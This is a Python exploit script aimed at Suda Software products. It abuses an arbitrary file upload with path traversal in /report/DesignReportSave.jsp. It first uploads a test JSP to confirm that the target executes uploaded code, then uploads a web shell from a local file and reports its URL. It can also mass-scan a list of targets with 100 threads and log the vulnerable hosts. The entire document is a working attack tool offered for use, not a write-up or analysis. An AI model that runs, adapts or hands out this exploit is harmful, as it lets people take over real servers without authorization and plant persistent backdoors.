#速达软件全系产品存在任意文件上传漏洞
import argparse,requests,sys,time,os
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner ='''

#                 #    #   ___                       
#=ooO=========Ooo=#    #  <_*_>            ,,,,,     
#  \\  (o o)  //  #    #  (o o)           /(o o)\    
--------(_)------------8---(_)--Ooo----ooO--(_)--Ooo-
                            author:q
                            v:0.0.2
'''
    print(banner)
def poc(target):
    url1 = target+'/report/DesignReportSave.jsp?report=../qbt.jsp'
    headers1 = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Connection': 'close',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Upgrade-Insecure-Requests': '1',
        'Content-Type': 'application/octet-stream',
        'Content-Length': '25'
    }
    data = '<% out.print("kkttxx");%>'
    try:
        res1 = requests.post(url=url1,headers=headers1,data=data,verify=False,timeout=15)
        url2 = target+'/qbt.jsp'
        res2 = requests.get(url=url2,headers=headers1,timeout=15,verify=False)
        if 'kkttxx' in res2.text:
                print("[+]"+ target + "存在漏洞")
                with open('seccess.txt','a',encoding='utf-8') as f:
                    f.write('[+]'+target+'存在漏洞\n')
                    return True
        else:
                print("[-]"+ target + "不存在")
                return False

    except:
                print('这是一个错误')
def exp(target):
    print('正在搞一个shell')
    time.sleep(3)
    os.system('cls')    
    url2 = target + '/report/DesignReportSave.jsp?report=../shell.jsp'
    headers1 = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Connection': 'close',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Upgrade-Insecure-Requests': '1',
        'Content-Type': 'application/octet-stream',
        'Content-Length': '25'
    }
    with open('shell.txt','r',encoding='utf-8') as f:
        data = f.read()
        # print(data)
    try:
        res = requests.post(url=url2,headers=headers1,data=data,verify=False,timeout=15)
        url3 = target + '/shell.jsp'
        res1 = requests.get(url=url3,verify=False,timeout=15)
        if res1.status_code == 200:
             print('成功上传,shell地址为'+url3)
        else:
             print('上传失败')
    except:
         print('未知错误')

def main():
    banner()
    parser = argparse.ArgumentParser(description='速达软件全系产品存在任意文件上传漏洞')
    parser.add_argument('-u','-url',dest='url',help='请输入url',type=str)
    parser.add_argument('-f','--file',dest='file',help='url.txt',type=str)
    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")



if __name__ == '__main__':
    main()

